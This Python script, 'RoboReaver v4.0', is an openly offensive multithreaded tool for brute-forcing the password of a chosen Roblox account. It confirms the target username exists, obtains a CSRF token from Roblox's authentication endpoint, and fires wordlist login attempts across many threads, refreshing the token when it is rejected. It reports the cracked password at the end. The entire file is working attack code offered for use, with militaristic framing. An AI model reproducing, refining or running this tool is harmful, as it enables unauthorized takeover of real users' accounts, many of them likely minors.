# ======================================================================= #
#                 RoboReaver v4.0 - The Colossus Edition                  #
# ======================================================================= #
#  Description: A monolithic, single-purpose, high-performance Roblox    #
#               brute-force instrument. Designed for robustness,         #
#               visual feedback, and unparalleled raw power.             #
#                                                                         #
#  Author: [Seu Nickname]                                                 #
#  GitHub: [Seu Link do GitHub]                                           #
# ======================================================================= #

# --- STAGE 0: SYSTEM AND DEPENDENCY INITIALIZATION ---
import os
import sys
import subprocess
import time
import threading
from colorama import Fore, Style, init
import json

def bootstrap_dependencies():
    """Ensures all required Python libraries are present, installing them if necessary."""
    init(autoreset=True)
    dependencies = ['requests', 'colorama']
    print(Style.BRIGHT + Fore.YELLOW + "[BOOTSTRAP] Verificando integridade das dependências...")
    all_ok = True
    for dep in dependencies:
        try:
            __import__(dep)
        except ImportError:
            all_ok = False
            print(Fore.RED + f"  -> Dependência '{dep}' ausente. Iniciando procedimento de instalação...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", dep])
                print(Fore.GREEN + f"  -> '{dep}' instalado com sucesso.")
            except subprocess.CalledProcessError:
                print(Fore.RED + Style.BRIGHT + f"[FATAL] Falha ao instalar '{dep}'. Instale com 'pip install {dep}' e tente novamente.")
                sys.exit(1)
    if all_ok:
        print(Fore.GREEN + "[BOOTSTRAP] Todas as dependências validadas.")
    print(Style.RESET_ALL + "-"*60)
    time.sleep(2)

bootstrap_dependencies()

class RoboReaverColossus:
    """
    A monolithic class encapsulating the entire attack chain, from target
    acquisition to final mission debriefing. It operates with military
    precision through a series of sequential stages.
    """
    
    # --- AESTHETIC ASSETS (ISOLATED TO PREVENT SYNTAX ERRORS) ---
    BANNER_MAIN = r"""
██████╗  ██████╗ ██████╗  ██████╗ ██████╗ ██╗   ██╗███████╗██████╗ 
██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗██╔══██╗██║   ██║██╔════╝██╔══██╗
██████╔╝██║   ██║██████╔╝██║   ██║██████╔╝██║   ██║█████╗  ██████╔╝
██╔══██╗██║   ██║██╔══██╗██║   ██║██╔══██╗██║   ██║██╔══╝  ██╔══██╗
██║  ██║╚██████╔╝██████╔╝╚██████╔╝██████╔╝╚██████╔╝███████╗██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
                    >> v4.0 - THE COLOSSUS <<
    """
    
    BANNER_SUCCESS = r"""
 __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __
|                                                                   |
|   __ __ __ __ __ __ __     __ __ __ __ __ __ __     __ __ __ __ __  |
|  |                     |   |                     |   |            |  |
|  |   K E Y   F O U N D   |   |   T A R G E T     |   |   NEUTRALI~  |  |
|  | __ __ __ __ __ __ __  |   |    N E U T R A L I Z E D    |   |      ZED   |  |
|  |                     |   | __ __ __ __ __ __ __  |   | __ __ __ __|  |
|  |__ __ __ __ __ __ __ __|   |                     |   |            |  |
|                          |   |__ __ __ __ __ __ __ __|   |__ __ __ __ __|  |
|__ __ __ __ __ __ __ __ __|                                         |
|                                                                   |
|                       P A S S W O R D   C R A C K E D               |
|__ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __ __|
    """
    
    BANNER_FAILURE = r"""
██████╗  █████╗ ██╗██╗     ███████╗
██╔══██╗██╔══██╗██║██║     ██╔════╝
██║  ██║███████║██║██║     █████╗  
██║  ██║██╔══██║██║██║     ██╔══╝  
██████╔╝██║  ██║██║███████╗███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝
    WORDLIST EXAUSTA. ALVO PERMANECE SEGURO.
    """

    def __init__(self):
        # Attack Configuration
        self.username = ""
        self.wordlist_path = ""
        self.thread_count = 20 # Default
        self.passwords = []
        
        # Real-time State
        self.password_found = None
        self.tested_count = 0
        self.last_tested_password = ""
        self.attack_running = False
        self.start_time = None
        
        # System
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Roblox/WinInet'})

    def _display_header(self):
        """Clears the screen and displays the main static banner."""
        os.system('clear')
        print(Fore.RED + Style.BRIGHT + self.BANNER_MAIN)
        print(Fore.YELLOW + "="*70)

    def _prompt(self, text):
        """Standardized input prompt."""
        return input(Fore.CYAN + Style.BRIGHT + f"[?] {text}: " + Fore.WHITE)

    # --- STAGE 1: TARGET ACQUISITION ---
    def acquire_target(self):
        """Gets necessary inputs from the user."""
        self._display_header()
        print(Fore.YELLOW + "STAGE 1: TARGET ACQUISITION")
        self.username = self._prompt("Digite o username do alvo no Roblox")
        self.wordlist_path = self._prompt("Digite o caminho para a sua wordlist (ex: wordlist.txt)")
        try:
            self.thread_count = int(self._prompt(f"Threads (padrão 20)"))
        except ValueError:
            print(Fore.YELLOW + "[INFO] Usando 20 threads como padrão.")
            self.thread_count = 20

    # --- STAGE 2: MUNITIONS CHECK ---
    def check_munitions(self):
        """Validates the provided wordlist file."""
        self._display_header()
        print(Fore.YELLOW + "STAGE 2: MUNITIONS CHECK")
        print(f"[INFO] Verificando wordlist em '{self.wordlist_path}'...")
        if not os.path.exists(self.wordlist_path):
            print(Fore.RED + "[FATAL] Arquivo da wordlist não encontrado. Abortando.")
            return False
        if os.path.getsize(self.wordlist_path) == 0:
            print(Fore.RED + "[FATAL] Wordlist está vazia. Abortando.")
            return False
        try:
            with open(self.wordlist_path, 'r', errors='ignore') as f:
                self.passwords = [line.strip() for line in f if line.strip()]
            print(Fore.GREEN + f"[SUCCESS] Munitions loaded: {len(self.passwords)} senhas prontas para o lançamento.")
            time.sleep(2)
            return True
        except Exception as e:
            print(Fore.RED + f"[FATAL] Não foi possível ler o arquivo da wordlist: {e}. Abortando.")
            return False

    # --- STAGE 3: PRE-FLIGHT SYSTEM VERIFICATION ---
    def pre_flight_check(self):
        """Verifies the target's existence and Roblox API connectivity."""
        self._display_header()
        print(Fore.YELLOW + "STAGE 3: PRE-FLIGHT SYSTEM VERIFICATION")
        # 3a: Verify username
        print(f"[INFO] Verificando existência do alvo '{self.username}'...")
        try:
            r = self.session.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [self.username]})
            if not (r.status_code == 200 and r.json().get('data')):
                print(Fore.RED + f"[FATAL] Alvo '{self.username}' não existe no universo Roblox. Abortando missão.")
                return False
            print(Fore.GREEN + "[SUCCESS] Alvo confirmado. Real e vulnerável.")
        except requests.RequestException:
            print(Fore.RED + "[FATAL] Falha de comunicação com os servidores de inteligência Roblox. Abortando.")
            return False
        
        # 3b: Verify API connectivity and CSRF token retrieval
        print("[INFO] Estabelecendo conexão com o endpoint de autenticação...")
        try:
            r = self.session.post("https://auth.roblox.com/v2/login")
            if "x-csrf-token" not in r.headers:
                print(Fore.RED + "[FATAL] Resposta do servidor Roblox inesperada. As defesas podem ter mudado. Abortando.")
                return False
            self.session.headers['X-CSRF-TOKEN'] = r.headers["x-csrf-token"]
            print(Fore.GREEN + "[SUCCESS] Canal de ataque estabelecido. Token CSRF adquirido.")
            time.sleep(2)
            return True
        except requests.RequestException:
            print(Fore.RED + "[FATAL] Servidores de autenticação Roblox não respondem. Abortando.")
            return False

    # --- STAGE 4: TACTICAL DISPLAY AND ENGINE IGNITION ---
    def _update_display_panel(self):
        """
        The core of the `aircrack-ng` style display. This runs in a
        separate thread to provide a real-time tactical overview.
        """
        while self.attack_running:
            os.system('clear')
            
            # --- Calculate real-time stats ---
            elapsed_seconds = time.time() - self.start_time
            pps = self.tested_count / elapsed_seconds if elapsed_seconds > 0 else 0
            
            total_passwords = len(self.passwords)
            percentage = (self.tested_count / total_passwords) * 100 if total_passwords > 0 else 0
            progress = int(percentage / 2) # 50-char bar
            
            # --- Format strings for display ---
            display_time = time.strftime('%H:%M:%S', time.gmtime(elapsed_seconds))
            progress_bar = f"[{Fore.GREEN}{'█' * progress}{Fore.RED}{' ' * (50 - progress)}{Style.RESET_ALL}]"
            
            # --- Print the panel ---
            print(Fore.RED + Style.BRIGHT + self.BANNER_MAIN)
            print(Fore.YELLOW + f"{'='*25} TACTICAL OVERVIEW {'='*26}")
            print(f"{Fore.CYAN}{'[ Target ]:' :<15}{Style.BRIGHT}{Fore.WHITE}{self.username}")
            print(f"{Fore.CYAN}{'[ Wordlist ]:' :<15}{Style.BRIGHT}{Fore.WHITE}{self.wordlist_path} ({total_passwords} candidates)")
            print(f"{Fore.CYAN}{'[ Threads ]:' :<15}{Style.BRIGHT}{Fore.WHITE}{self.thread_count} attack vectors")
            print(f"{'='*70}")
            print(f"{Fore.CYAN}{'[ Time Elapsed ]:' :<20}{Style.BRIGHT}{Fore.WHITE}{display_time}")
            print(f"{Fore.CYAN}{'[ Tested ]:' :<20}{Style.BRIGHT}{Fore.WHITE}{self.tested_count}/{total_passwords} ({percentage:.2f}%)")
            print(f"{Fore.CYAN}{'[ Speed ]:' :<20}{Style.BRIGHT}{Fore.WHITE}{pps:.2f} p/s")
            print(f"{Fore.CYAN}{'[ Last Try ]:' :<20}{Style.BRIGHT}{Fore.WHITE}{self.last_tested_password}")
            print(f"{progress_bar}")
            print(Fore.YELLOW + f"{'='*70}")
            
            time.sleep(0.2)

    # --- STAGE 5: ENGAGE - THE ATTACK LOGIC ---
    def _worker(self, password_queue):
        """
        A single attack thread. It fetches a password from the queue and
        attempts to breach the target's defenses.
        """
        while not self.password_found and not password_queue.empty():
            password = password_queue.get()
            
            with self.lock:
                self.last_tested_password = password
            
            try:
                # The login payload
                payload = {"ctype": "Username", "cvalue": self.username, "password": password}
                
                # The actual login request
                r = self.session.post("https://auth.roblox.com/v2/login", json=payload)
                
                with self.lock:
                    self.tested_count += 1
                
                # Check for success
                if "user" in r.json():
                    with self.lock:
                        self.password_found = password
                        self.attack_running = False # Signal all threads to stop
                # Check for CSRF token expiration (a common defense)
                elif r.status_code == 403 and "Token Validation Failed" in r.text:
                    # Re-acquire token and retry this password
                    new_token_resp = self.session.post("https://auth.roblox.com/v2/login")
                    if "x-csrf-token" in new_token_resp.headers:
                        self.session.headers['X-CSRF-TOKEN'] = new_token_resp.headers["x-csrf-token"]
                    password_queue.put(password) # Put password back in queue to retry
                    
            except (requests.RequestException, json.JSONDecodeError):
                # If network fails, put the password back to be tried by another thread
                password_queue.put(password)
            
            password_queue.task_done()

    def engage(self):
        """The main method to orchestrate the multi-threaded attack."""
        self._display_header()
        print(Fore.YELLOW + "STAGE 4 & 5: ENGINE IGNITION & ENGAGEMENT")
        print(Fore.RED + Style.BRIGHT + "WARNING: INITIATING ATTACK PROTOCOL. HIT CTRL+C TO ABORT.")
        time.sleep(3)
        
        # Prepare the password queue
        from queue import Queue
        password_queue = Queue()
        for p in self.passwords:
            password_queue.put(p)
            
        # Set initial state
        self.attack_running = True
        self.start_time = time.time()
        
        # Start the tactical display
        display_thread = threading.Thread(target=self._update_display_panel)
        display_thread.daemon = True
        display_thread.start()
        
        # Launch worker threads
        threads = []
        for _ in range(self.thread_count):
            t = threading.Thread(target=self._worker, args=(password_queue,))
            t.daemon = True
            t.start()
            threads.append(t)
            
        # Wait for either completion or user interruption
        try:
            while self.attack_running and not password_queue.empty():
                # We check the queue status as an additional stop condition
                if all(not t.is_alive() for t in threads):
                    self.attack_running = False
                    break
                time.sleep(1)
        except KeyboardInterrupt:
            self.attack_running = False
            print("\n" + Fore.RED + "[ABORT] User initiated shutdown signal. Terminating attack vectors...")
        
        self.attack_running = False # Final signal to stop display
        display_thread.join(timeout=1)
        password_queue.join() # Wait for all tasks in queue to be marked as done

    # --- STAGE 6: MISSION DEBRIEF ---
    def debrief(self):
        """Displays the final outcome of the attack."""
        os.system('clear')
        if self.password_found:
            print(Fore.GREEN + Style.BRIGHT + self.BANNER_SUCCESS)
            print("\n" + Fore.WHITE + Style.BRIGHT + f"MISSION SUCCESSFUL. The password for '{self.username}' is:")
            print(Fore.YELLOW + Style.BRIGHT + f"\n\t\t>>> {self.password_found} <<<\n")
        else:
            print(Fore.RED + Style.BRIGHT + self.BANNER_FAILURE)
            print("\n" + Fore.WHITE + Style.BRIGHT + "MISSION FAILED. The correct password was not in your wordlist.")
        
        input(Fore.CYAN + "\nPressione Enter para reiniciar o Colossus...")

    def launch_sequence(self):
        """The main execution flow of the program."""
        self.acquire_target()
        if self.check_munitions():
            if self.pre_flight_check():
                self.engage()
                self.debrief()
        else:
            time.sleep(3)

# --- PROGRAM ENTRY POINT ---
if __name__ == "__main__":
    while True:
        try:
            colossus = RoboReaverColossus()
            colossus.launch_sequence()
        except Exception as e:
            # A failsafe for any unexpected errors
            os.system('clear')
            print(Fore.RED + Style.BRIGHT + "[FATAL SYSTEM ERROR]")
            print(f"O Colossus encontrou uma falha catastrófica: {e}")
            print("Reiniciando a interface em 5 segundos...")
            time.sleep(5)
